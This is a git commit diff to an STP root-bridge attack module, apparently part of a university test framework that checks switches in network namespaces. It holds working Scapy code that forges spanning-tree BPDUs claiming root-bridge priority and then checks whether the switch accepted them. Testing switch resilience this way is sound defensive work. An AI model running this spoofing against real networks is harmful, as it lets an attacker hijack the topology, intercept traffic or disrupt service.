096d8980b314a5981388b5c7b9e07b2dda642ed9
Willi Meißner <willi.meissner@mailbox.tu-dresden.de>
2023-08-07 13:13:11 +0200

    support STP packets in addition to RSTP

--- attacks/STProot.py
+++ attacks/STProot.py
@@ -9,8 +9,8 @@ class STProot(Attack):
 
     def setup(self):
         with netns.NetNS(nsname=self.attack_ns):
-            packet = scapy.sniff(filter="ether dst 01:80:c2:00:00:00", iface=self.attack_if, count=1, timeout=5)
-            if packet is None:
+            packet = scapy.sniff(filter="ether dst 01:80:c2:00:00:00", iface=self.attack_if, count=1, timeout=10)
+            if len(packet) == 0:
                 raise RuntimeError("No STP packets on Link.")
             else:
                 if (packet[0].bpduflags & 0b1100) == 8:
@@ -18,7 +18,7 @@ class STProot(Attack):
 
     def attack(self) -> scapy.Packet:
         with netns.NetNS(nsname=self.attack_ns):
-            packet = scapy.sniff(filter="ether dst 01:80:c2:00:00:00", iface=self.attack_if, count=1, timeout=5)
+            packet = scapy.sniff(filter="ether dst 01:80:c2:00:00:00", iface=self.attack_if, count=1, timeout=10)
             packet[0].src='00:00:00:00:00:01'
             packet[0].rootid=0
             packet[0].rootmac='00:00:00:00:00:01'
@@ -26,18 +26,22 @@ class STProot(Attack):
             packet[0].bridgemac='00:00:00:00:00:01'
 
             scapy.sendp(packet[0], iface=self.attack_if)
-            ans = scapy.sniff(filter="ether dst 01:80:c2:00:00:00", iface=self.attack_if, count=1, timeout=5)
+            ans = scapy.sniff(filter="ether dst 01:80:c2:00:00:00", iface=self.attack_if, count=1, timeout=30)
             return ans[0]
 
     def evaluate(self, ans:scapy.Packet) -> bool:
-        if (ans.bpduflags & 0b1100) == 8:
+        # Check for Topology Change
+        if ans.bpdutype == 0x80:
+            return True
+        # Check RSTP Packet for Root Bridge Port Type
+        elif ans.bpdutype == 0x02 and (ans.bpduflags & 0b1100) == 8:
             return True
         else:
             return False
 
     def run(self) -> bool:
-        self.attack_if = self.interfaces[1]
-        self.attack_ns = "host1"
+        self.attack_if = self.interfaces[2]
+        self.attack_ns = "host2"
         self.setup()
         answer = self.attack()
 
